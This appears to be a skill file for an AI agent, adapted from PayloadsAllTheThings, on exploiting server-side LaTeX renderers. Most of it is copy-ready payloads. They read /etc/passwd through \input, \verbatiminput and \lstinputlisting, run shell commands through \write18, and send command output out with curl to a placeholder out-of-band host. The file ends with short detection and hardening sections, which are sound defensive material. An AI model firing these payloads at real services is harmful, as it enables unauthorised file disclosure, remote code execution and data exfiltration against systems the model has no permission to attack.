---
name: latex-injection
description: Exploit server-side LaTeX renderers to read files, execute shell commands via \write18, and leak data through verbatim/input commands
domain: cybersecurity
subdomain: web-application-security
tags: [latex, injection, write18, file-read, rce]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/LaTeX Injection
---

# LaTeX Injection

## Overview
Apps that render user input through LaTeX (PDF generation, math in CMS, scientific paper services) can be tricked into reading files or executing shell commands when `\write18` (shell-escape) is enabled.

## File Read
```latex
\input{/etc/passwd}
\include{/etc/hostname}
\catcode`\#=12  \input|"cat /etc/passwd"
\verbatiminput{/etc/passwd}
\lstinputlisting{/etc/passwd}
```

## Command Execution (`-shell-escape` enabled)
```latex
\immediate\write18{id > /tmp/x}
\write18{curl http://OOB/$(whoami)}
```
Restricted mode allows a whitelist of commands (`bibtex`, `kpsewhich`, etc.) — `kpsewhich` itself can be abused for info disclosure.

## OOB / Blind
```latex
\immediate\write18{curl http://oob/?d=`whoami`}
\href{run:/usr/bin/id}{click}      % older viewer abuse
```

## Detection
- Submit `\input{/etc/passwd}` and see if `/etc/passwd` lands in the PDF.
- Submit `\immediate\write18{ping OOB.example.com}` and watch DNS interactions.
- Inspect generated PDF metadata for LaTeX engine (`pdfTeX-1.40...`).

## Hardening
- Run LaTeX without `-shell-escape` (default).
- Sandbox in container with no network and read-only FS.
- Use a whitelisted subset compiler (e.g. **MathJax** for math-only rendering instead of full LaTeX).
- Strip / escape `\input`, `\include`, `\write18`, `\href{run:...}` from user input.

## References
- `payloadsallthethings/LaTeX Injection/README.md`
- "Hacking with LaTeX" — Sebastian Neef.
